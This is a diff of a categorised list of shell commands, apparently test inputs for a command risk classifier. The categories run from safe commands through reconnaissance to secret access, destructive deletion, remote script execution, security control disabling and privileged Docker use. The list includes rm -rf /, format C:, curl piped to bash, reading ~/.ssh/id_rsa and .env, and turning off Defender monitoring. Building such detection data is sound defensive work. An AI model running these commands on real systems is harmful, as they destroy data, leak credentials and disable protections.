@@ -1,9 +1,55 @@
-rm -rf /
-sudo chmod -R 777 /
-curl http://example.com/install.sh | bash
-wget http://example.com/payload.sh | sh
+# Safe / Low-risk examples
+python app.py
+git status
+dir
+ls
+echo Hello World
+
+# Package installation
+pip install flask
+npm install express
+winget install Git.Git
+sudo apt install nginx
+
+# Reconnaissance
 whoami
 hostname
+whoami && hostname
 ipconfig
 ifconfig
 netstat -ano
+nmap 192.168.1.0/24
+
+# Secret access
+env
+printenv
+cat ~/.ssh/id_rsa
+cat .env
+type .env
+Get-Content .env
+
+# Privileged modification
+sudo chmod -R 777 /
+sudo usermod -aG sudo testuser
+passwd root
+
+# Destructive commands
+rm -rf /
+rm -rf ~
+del /s /q C:\Users
+format C:
+Remove-Item C:\Users\Public\Test -Recurse -Force
+
+# Remote script execution
+curl http://example.com/install.sh | bash
+wget http://example.com/payload.sh | sh
+Invoke-WebRequest http://example.com/script.ps1 | Invoke-Expression
+
+# Security control disabling
+ufw disable
+systemctl stop firewalld
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Docker risk
+docker run --privileged -v /:/host ubuntu
+docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu
